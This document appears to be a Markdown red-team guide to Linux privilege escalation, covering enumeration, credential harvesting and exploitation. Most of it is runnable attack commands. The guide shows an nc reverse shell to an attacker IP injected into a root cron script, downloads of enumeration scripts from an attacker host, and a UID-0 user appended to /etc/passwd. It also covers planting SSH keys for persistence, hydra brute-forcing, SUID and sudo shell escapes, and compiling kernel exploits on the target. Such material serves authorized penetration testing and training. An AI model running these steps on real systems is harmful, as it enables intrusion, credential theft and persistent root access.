# Linux Privilege Escalation

## Overview

Effective privilege escalation on Linux demands disciplined reconnaissance, precise analysis of trust boundaries, and carefully executed exploits. This guide mirrors the structure and technical depth of the Windows privilege escalation guide: clear sections, actionable commands, and reusable tradecraft designed for penetration testers and red-team operators. The focus is on techniques and workflows—not lab-specific walkthroughs.

## Learning Objectives

- Build a comprehensive Linux enumeration workflow covering identity, processes, networking, storage, and permissions.
- Identify exposed confidential information across user artifacts and system telemetry.
- Abuse writable jobs, binaries, and authentication stores to weaponize privilege boundaries.
- Escalate via system components (SUID, sudo, kernel) with repeatable, low-noise techniques.

## Table of Contents

1. [Enumerating Linux](#1-enumerating-linux)  
   1.1 [Linux Privilege Model Basics](#11-linux-privilege-model-basics)  
   1.2 [Manual Enumeration Workflow](#12-manual-enumeration-workflow)  
   1.3 [Automated Enumeration](#13-automated-enumeration)  
2. [Exposed Confidential Information](#2-exposed-confidential-information)  
   2.1 [User Trails & Shell Artifacts](#21-user-trails--shell-artifacts)  
   2.2 [System Trails & Live Telemetry](#22-system-trails--live-telemetry)  
3. [Insecure File Permissions](#3-insecure-file-permissions)  
   3.1 [Writable Scheduled Jobs](#31-writable-scheduled-jobs)  
   3.2 [Writable Authentication Stores](#32-writable-authentication-stores)  
4. [Insecure System Components](#4-insecure-system-components)  
   4.1 [SUID Programs & Capabilities](#41-suid-programs--capabilities)  
   4.2 [Sudo Misconfigurations](#42-sudo-misconfigurations)  
   4.3 [Kernel Vulnerabilities](#43-kernel-vulnerabilities)

---

# 1. Enumerating Linux

Enumeration is the backbone of every Linux escalation. Start broad, capture facts, then refine targets.

## 1.1 Linux Privilege Model Basics

### Filesystem Permissions

```bash
ls -l /etc/shadow
# -rw-r----- 1 root shadow 1762 May  2 09:31 /etc/shadow
```

- Owner/group/others each have `rwx` flags.
- Directories treat `x` as “traverse” (enter) and `r` as “list entries.”

### Real vs. Effective UID/GID

```bash
ps u -C passwd
grep Uid /proc/<pid>/status
```

- Real UID = launching user.  
- Effective UID = permissions enforced; SUID/SGID binaries set this to file owner/group.

## 1.2 Manual Enumeration Workflow

### Identity & Group Recon

```bash
whoami
id
cat /etc/passwd
groups
sudo -l          # if password known
```

- Flag service accounts, shell-bearing users, and privileged groups (`sudo`, `docker`, `lxd`, `adm`).

### Host & OS Fingerprinting

```bash
hostnamectl
cat /etc/os-release
uname -a
lsb_release -a      # if present
```

- Capture distro, release, kernel, architecture for exploit matching.

### Processes & Services

```bash
ps aux --sort=-%mem | head
systemctl list-units --type=service --state=running
netstat -plant | grep LISTEN     # or ss -plant
```

- Prioritize root-owned interpreters, custom daemons, and backup/automation scripts.

### Network & Routing

```bash
ip addr show
ip route show
ss -anptu
```

- Multi-homed hosts indicate pivot potential; loopback-only services often hide local escalation vectors.

### Firewall / Packet Filters

```bash
sudo iptables -L -n -v
sudo ufw status verbose
sudo firewall-cmd --list-all
cat /etc/iptables/rules.v4 2>/dev/null
```

- Without sudo, look for persisted configs created by `iptables-save`, `firewalld`, or `nftables`.

### Scheduled Jobs

```bash
ls -lah /etc/cron.*
cat /etc/crontab
crontab -l
sudo crontab -l
systemctl list-timers --all
```

- Note scripts executed as root but stored in user-writable directories (`/home/*/.scripts`, `/opt`, `/usr/local/bin`).

### Package Inventory

```bash
dpkg -l | tee /tmp/pkglist      # Debian/Ubuntu
rpm -qa | tee /tmp/pkglist      # RHEL/CentOS
```

- Cross-reference versions with CVE feeds or `searchsploit`.

### Writable Paths & Binaries

```bash
find / -writable -type d -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
find / -perm -2 -type f 2>/dev/null         # world-writable files
```

- Focus on directories intersecting with PATH, cron, systemd, or service binaries.

### Storage & Mounts

```bash
lsblk
cat /etc/fstab
mount | column -t
findmnt -t nfs,cifs
```

- Unmounted partitions or network shares may hold credentials or backups.

### Kernel Modules

```bash
lsmod
/sbin/modinfo <module>
```

- Third-party drivers often introduce attack surface.

### Special Permissions & Capabilities

```bash
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -2000 -type f 2>/dev/null    # SGID
/usr/sbin/getcap -r / 2>/dev/null
```

- Feed results into GTFOBins or craft custom payloads.

## 1.3 Automated Enumeration

Automation supplements—not replaces—manual work.

### unix-privesc-check

```bash
/usr/bin/unix-privesc-check standard > /tmp/upc-standard.txt
/usr/bin/unix-privesc-check detailed > /tmp/upc-detailed.txt
```

- Standard: quick, minimal noise.  
- Detailed: follows file handles/scripts, more false positives but deeper coverage.

### LinEnum

```bash
wget http://<attacker>/LinEnum.sh -O /tmp/LinEnum.sh
chmod +x /tmp/LinEnum.sh
/tmp/LinEnum.sh -r report -e /tmp/linenum.log
```

- Summarizes cron, SUID, capabilities, network, and writable directories.

### LinPEAS

```bash
wget http://<attacker>/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.log
```

- Color-coded output highlights “High” and “Very High” priority findings.

### Recommended Flow

1. Manual enumeration for context.  
2. Run 1–2 automated tools.  
3. Merge findings, remove duplicates, prioritize escalation paths.

---

# 2. Exposed Confidential Information

Credentials leak everywhere: dotfiles, history, logs, and live traffic. Harvest them before resorting to complex exploits.

## 2.1 User Trails & Shell Artifacts

### Dotfiles & History

```bash
ls -a ~
tail -n 200 ~/.bash_history
grep -R "password\|token\|secret" ~/.*
```

- Inspect `~/.config`, `~/.aws`, `~/.kube`, `~/.docker`, `~/.gnupg`, `~/.ssh/`.

### Environment Variables & Startup Scripts

```bash
env | sort
grep -R "export" ~/.bashrc ~/.profile ~/.bash_profile /etc/profile /etc/bash.bashrc
```

- Variables like `DB_PASS`, `API_KEY`, `SCRIPT_CREDENTIALS` often hold plaintext secrets.

### Credential Reuse & Wordlists

```bash
crunch 6 6 -t Lab%%% -o /tmp/wordlist
hydra -l eve -P /tmp/wordlist ssh://192.168.50.214 -t 4 -V
```

- Seed wordlists with discovered patterns; test across local users, services, VPNs, and sudo.

### SSH Keys

```bash
grep -R "BEGIN RSA PRIVATE KEY" -n /home /root 2>/dev/null
```

- Copy readable private keys; attempt authentication or crack `id_rsa` with `ssh2john`.

## 2.2 System Trails & Live Telemetry

### Process Monitoring

```bash
watch -n 1 "ps aux | grep -Ei 'pass|key|token|cred'"
sudo strings /proc/<pid>/environ | tr '\0' '\n'
```

- Look for `sshpass`, backup scripts, or daemons embedding credentials in arguments or environment variables.

### Packet Capture

```bash
sudo tcpdump -i lo -A | grep -Ei "pass|token|auth"
sudo tcpdump -i any port 389 -w /tmp/ldap.pcap
```

- Loopback captures expose services bound only to localhost; sniff HTTP basic auth, LDAP binds, SMTP logins.

### Logs & Journals

```bash
grep -Ri "password" /var/log 2>/dev/null
journalctl -u <service> | grep -Ei "auth|err|secret"
```

- Debug logging tiers frequently dump database or API credentials.

### Systemd & Service Configs

```bash
systemctl cat <service>
cat /etc/systemd/system/<service>.service
```

- Inspect `Environment=`, `ExecStart`, and helper scripts for stored secrets.

---

# 3. Insecure File Permissions

Writable artifacts executed by privileged contexts provide deterministic escalation routes.

## 3.1 Writable Scheduled Jobs

### Finding Vulnerable Jobs

```bash
grep CRON /var/log/syslog 2>/dev/null | tail
cat /etc/crontab
find /etc/cron.* -type f -exec ls -lah {} \;
systemctl list-timers --all
```

- Note any job running as root but residing in user-writable directories (`/home/*/.scripts`, `/tmp`, `/opt`).

### Weaponization Blueprint

1. Confirm file ownership/permissions.
2. Backup original script.
3. Inject payload (reverse shell, user creation, binary drop).
4. Start listener (`nc -lnvp <port>`) or monitor logs.
5. Restore original content post-execution if stealth is required.

### Sample Reverse Shell Payload

```bash
cat <<'EOF' >> /home/joe/.scripts/user_backups.sh
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 4444 >/tmp/f
EOF
nc -lnvp 4444
```

## 3.2 Writable Authentication Stores

### /etc/passwd Injection

```bash
ls -l /etc/passwd
openssl passwd -6 'P@ssw0rd!'      # SHA512 hash
echo 'root2:$6$hash:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su - root2
```

- UID/GID `0` grants full root access. Prefer SHA512 (`-6`) to ensure compatibility with modern pam configs.

### SSH Authorized Keys

```bash
find / -type f -name authorized_keys -writable 2>/dev/null
echo "ssh-ed25519 AAAAC3..." >> /root/.ssh/authorized_keys
```

- Plant keys in writable `authorized_keys` for privileged users to gain persistent access.

### Application Configs

```bash
grep -R "password" /etc /opt /var/www 2>/dev/null | head
```

- Extract DB/service credentials from config files, then authenticate as those accounts or re-use passwords for local escalation.

---

# 4. Insecure System Components

When user-space avenues dry up, attack the primitives enforcing privilege separation.

## 4.1 SUID Programs & Capabilities

### Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
```

- Feed results into GTFOBins; focus on interpreters, archive tools, network utilities, and custom binaries.

### Example Exploits

- **SUID `find`:**

```bash
find /tmp -exec /bin/sh -p \; -quit
```

- **Perl with `cap_setuid+ep`:**

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

## 4.2 Sudo Misconfigurations

### Enumerate Privileges

```bash
sudo -l
```

- Analyze allowed commands for shell escapes, file edits, service control, or interpreter pivots.

### Common Attack Patterns

- **less/more/vim**: `sudo less /etc/passwd` → `! /bin/sh`
- **apt-get**: `sudo apt-get changelog apt` → inside pager run `!/bin/sh`
- **systemctl**: `sudo systemctl status <service>` → press `! /bin/sh`
- **tar/rsync/find**: Use built-in execution hooks (`--checkpoint-action`, `--use-compress-program`, `-exec`).

### MAC Enforcement

```bash
sudo aa-status
getenforce
```

- AppArmor/SELinux may block sudo-based payloads (e.g., `tcpdump`). If so, pivot to another allowed command or adjust profile when authorized.

## 4.3 Kernel Vulnerabilities

### Recon

```bash
uname -a
cat /etc/os-release
```
- Document kernel, distro, architecture for exploit matching.

### Research & Selection

```bash
searchsploit "linux kernel <distro> <version> privilege"
```

- Filter by kernel range, exploit stability, and required dependencies.

### Compile & Execute

```bash
scp exploit.c user@target:/tmp/
gcc /tmp/exploit.c -o /tmp/exploit
/tmp/exploit
id
```

### Screen Vulnerabilities
```bash
ls -l /usr/bin/screen*
```

- Prefer compiling on the target to avoid dependency mismatches. Clean up binaries and logs per engagement rules.

---
